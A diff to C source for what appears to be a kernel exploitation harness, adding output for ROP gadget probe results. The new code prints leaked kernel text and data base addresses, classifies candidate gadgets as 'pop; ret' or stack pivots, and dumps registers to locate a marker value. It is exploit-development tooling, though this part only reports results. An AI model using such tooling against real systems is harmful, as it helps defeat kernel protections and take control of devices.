@@ -365,6 +365,49 @@ static void _kldload(void* data, size_t data_size)
         }
 
         printf("\n=== END CHAIN PREP ===\n");
+    } else if (magic == 0x47505242) { /* "GPRB" - gadget probe results */
+        uint32_t status = (uint32_t)(readback[0] >> 32);
+        uint64_t cand_addr = readback[3];
+        uint32_t mode = (uint32_t)(readback[4] & 0xFFFFFFFF);
+        uint32_t rcode = (uint32_t)(readback[4] >> 32);
+        uint64_t marker_id = readback[5];
+
+        printf("\n=== GADGET PROBE RESULTS ===\n");
+        printf("  kdata_base:  %#lx\n", readback[1]);
+        printf("  ktext_base:  %#lx\n", readback[2]);
+        printf("  candidate:   %#lx (ktext+%#lx)\n",
+               cand_addr, cand_addr - readback[2]);
+        printf("  mode:        %s\n", mode == 0 ? "pop_ret" : "pivot");
+        printf("  status:      %s\n",
+               status == 1 ? "COMPLETED" :
+               status == 0xAAAA ? "THREAD DIED (bad gadget)" : "unknown");
+        printf("  result:      %s\n",
+               rcode == 1 ? "returned normally" :
+               rcode == 2 ? "PIVOT DETECTED!" :
+               rcode == 0xAAAA ? "crashed" : "unknown");
+
+        if (mode == 0 && rcode == 1) {
+            static const char* rnames[] = {
+                "RAX", "RBX", "RCX", "RDX", "RSI", "RDI", "RBP", "R8 ",
+                "R9 ", "R10", "R11", "R12", "R13", "R14", "R15", "RSP"
+            };
+            #define GPRB_MARKER 0xBEEF0000CAFE4242ULL
+            if (marker_id <= 15) {
+                printf("\n  >>> FOUND: pop %s; ret <<<\n", rnames[marker_id]);
+            } else {
+                printf("\n  No register holds the marker — not a simple pop;ret\n");
+            }
+            printf("\n  Register dump:\n");
+            for (int i = 0; i < 16; i++) {
+                uint64_t val = readback[6 + i];
+                const char* note = (val == GPRB_MARKER) ? " <-- MARKER" : "";
+                printf("    %s: %#018lx%s\n", rnames[i], val, note);
+            }
+        } else if (mode == 1 && rcode == 2) {
+            printf("\n  >>> PIVOT GADGET FOUND at %#lx <<<\n", cand_addr);
+        }
+
+        printf("\n=== END GADGET PROBE ===\n");
     } else {
         /* Generic readback - check for test markers */
         uint64_t val0 = readback[0];
